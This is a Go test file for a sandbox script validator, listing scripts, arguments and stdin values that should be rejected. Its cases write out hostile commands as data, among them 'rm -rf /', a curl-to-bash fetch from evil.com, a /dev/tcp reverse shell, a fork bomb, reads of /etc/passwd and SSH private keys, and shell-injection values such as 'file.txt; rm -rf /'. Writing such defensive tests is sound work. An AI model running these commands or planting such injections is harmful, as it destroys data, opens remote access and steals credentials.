package sandbox

import (
	"testing"
)

func TestScriptValidator_ValidateScript(t *testing.T) {
	v := NewScriptValidator()

	tests := []struct {
		name       string
		content    string
		shouldFail bool
		errorType  string
	}{
		{
			name:       "safe python script",
			content:    `print("Hello, World!")`,
			shouldFail: false,
		},
		{
			name:       "safe bash script",
			content:    `#!/bin/bash\necho "Hello"`,
			shouldFail: false,
		},
		{
			name:       "dangerous rm -rf /",
			content:    `rm -rf /`,
			shouldFail: true,
			errorType:  "dangerous_command",
		},
		{
			name:       "curl pipe to bash",
			content:    `curl http://evil.com/script.sh | bash`,
			shouldFail: true,
			errorType:  "dangerous_pattern",
		},
		{
			name:       "reverse shell pattern",
			content:    `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`,
			shouldFail: true,
			errorType:  "reverse_shell",
		},
		{
			name:       "python os.system",
			content:    `os.system("rm -rf /")`,
			shouldFail: true,
			errorType:  "dangerous_pattern",
		},
		{
			name:       "python subprocess with shell=True",
			content:    `subprocess.call("ls", shell=True)`,
			shouldFail: true,
			errorType:  "dangerous_pattern",
		},
		{
			name:       "eval function",
			content:    `eval(user_input)`,
			shouldFail: true,
			errorType:  "dangerous_pattern",
		},
		{
			name:       "base64 decode execution",
			content:    `echo "..." | base64 -d | bash`,
			shouldFail: true,
			errorType:  "dangerous_pattern",
		},
		{
			name:       "network access curl",
			content:    `curl https://example.com`,
			shouldFail: true,
			errorType:  "network_access",
		},
		{
			name:       "network access wget",
			content:    `wget https://example.com`,
			shouldFail: true,
			errorType:  "network_access",
		},
		{
			name:       "python requests",
			content:    `requests.get("https://example.com")`,
			shouldFail: true,
			errorType:  "network_access",
		},
		{
			name:       "docker command",
			content:    `docker run ubuntu`,
			shouldFail: true,
			errorType:  "dangerous_command",
		},
		{
			name:       "kubectl command",
			content:    `kubectl get pods`,
			shouldFail: true,
			errorType:  "dangerous_command",
		},
		{
			name:       "fork bomb",
			content:    `:(){:|:&};:`,
			shouldFail: true,
			errorType:  "dangerous_command",
		},
		{
			name:       "python pickle load",
			content:    `pickle.load(file)`,
			shouldFail: true,
			errorType:  "dangerous_pattern",
		},
		{
			name:       "access /etc/passwd",
			content:    `cat /etc/passwd`,
			shouldFail: true,
			errorType:  "dangerous_command",
		},
		{
			name:       "ssh key access",
			content:    `cat ~/.ssh/id_rsa`,
			shouldFail: true,
			errorType:  "dangerous_command",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := v.ValidateScript(tt.content)

			if tt.shouldFail && result.Valid {
				t.Errorf("expected validation to fail but it passed")
			}

			if !tt.shouldFail && !result.Valid {
				t.Errorf("expected validation to pass but it failed: %v", result.Errors)
			}

			if tt.shouldFail && !result.Valid && tt.errorType != "" {
				found := false
				for _, err := range result.Errors {
					if err.Type == tt.errorType {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("expected error type %s but got: %v", tt.errorType, result.Errors)
				}
			}
		})
	}
}

func TestScriptValidator_ValidateArgs(t *testing.T) {
	v := NewScriptValidator()

	tests := []struct {
		name       string
		args       []string
		shouldFail bool
		errorType  string
	}{
		{
			name:       "safe args",
			args:       []string{"--input", "file.txt", "--output", "result.json"},
			shouldFail: false,
		},
		{
			name:       "command chaining with semicolon",
			args:       []string{"--input", "file.txt; rm -rf /"},
			shouldFail: true,
			errorType:  "shell_injection",
		},
		{
			name:       "command chaining with &&",
			args:       []string{"file.txt && rm -rf /"},
			shouldFail: true,
			errorType:  "shell_injection",
		},
		{
			name:       "command chaining with ||",
			args:       []string{"file.txt || cat /etc/passwd"},
			shouldFail: true,
			errorType:  "shell_injection",
		},
		{
			name:       "pipe injection",
			args:       []string{"input | cat /etc/passwd"},
			shouldFail: true,
			errorType:  "shell_injection",
		},
		{
			name:       "command substitution $(...)",
			args:       []string{"$(whoami)"},
			shouldFail: true,
			errorType:  "command_substitution",
		},
		{
			name:       "command substitution backtick",
			args:       []string{"`whoami`"},
			shouldFail: true,
			errorType:  "command_substitution",
		},
		{
			name:       "output redirection",
			args:       []string{"> /etc/passwd"},
			shouldFail: true,
			errorType:  "shell_injection",
		},
		{
			name:       "newline injection",
			args:       []string{"file.txt\nrm -rf /"},
			shouldFail: true,
			errorType:  "shell_injection",
		},
		{
			name:       "path traversal",
			args:       []string{"../../../etc/passwd"},
			shouldFail: true,
			errorType:  "arg_injection",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := v.ValidateArgs(tt.args)

			if tt.shouldFail && result.Valid {
				t.Errorf("expected validation to fail but it passed")
			}

			if !tt.shouldFail && !result.Valid {
				t.Errorf("expected validation to pass but it failed: %v", result.Errors)
			}

			if tt.shouldFail && !result.Valid && tt.errorType != "" {
				found := false
				for _, err := range result.Errors {
					if err.Type == tt.errorType {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("expected error type %s but got: %v", tt.errorType, result.Errors)
				}
			}
		})
	}
}

func TestScriptValidator_ValidateStdin(t *testing.T) {
	v := NewScriptValidator()

	tests := []struct {
		name       string
		stdin      string
		shouldFail bool
	}{
		{
			name:       "safe data",
			stdin:      `{"key": "value", "number": 123}`,
			shouldFail: false,
		},
		{
			name:       "plain text",
			stdin:      "Hello, World!",
			shouldFail: false,
		},
		{
			name:       "command substitution",
			stdin:      "data $(rm -rf /)",
			shouldFail: true,
		},
		{
			name:       "backtick command",
			stdin:      "data `whoami`",
			shouldFail: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := v.ValidateStdin(tt.stdin)

			if tt.shouldFail && result.Valid {
				t.Errorf("expected validation to fail but it passed")
			}

			if !tt.shouldFail && !result.Valid {
				t.Errorf("expected validation to pass but it failed: %v", result.Errors)
			}
		})
	}
}

func TestScriptValidator_ValidateAll(t *testing.T) {
	v := NewScriptValidator()

	// Test comprehensive validation
	result := v.ValidateAll(
		`print("Hello")`,                // safe script
		[]string{"--input", "file.txt"}, // safe args
		`{"data": "value"}`,             // safe stdin
	)

	if !result.Valid {
		t.Errorf("expected comprehensive validation to pass but it failed: %v", result.Errors)
	}

	// Test with dangerous script
	result = v.ValidateAll(
		`os.system("rm -rf /")`,
		[]string{"--input", "file.txt"},
		`{"data": "value"}`,
	)

	if result.Valid {
		t.Errorf("expected comprehensive validation to fail but it passed")
	}

	// Test with dangerous args
	result = v.ValidateAll(
		`print("Hello")`,
		[]string{"--input", "file.txt; rm -rf /"},
		`{"data": "value"}`,
	)

	if result.Valid {
		t.Errorf("expected comprehensive validation to fail due to dangerous args but it passed")
	}
}

func TestValidationError_Error(t *testing.T) {
	err := &ValidationError{
		Type:    "dangerous_command",
		Pattern: "rm -rf",
		Context: "rm -rf /",
		Message: "Script contains dangerous command",
	}

	errStr := err.Error()
	if errStr == "" {
		t.Error("Error() should return non-empty string")
	}

	if !contains(errStr, "dangerous_command") {
		t.Error("Error() should contain error type")
	}
}

func contains(s, substr string) bool {
	return len(s) >= len(substr) && (s == substr || len(s) > 0 && containsHelper(s, substr))
}

func containsHelper(s, substr string) bool {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}
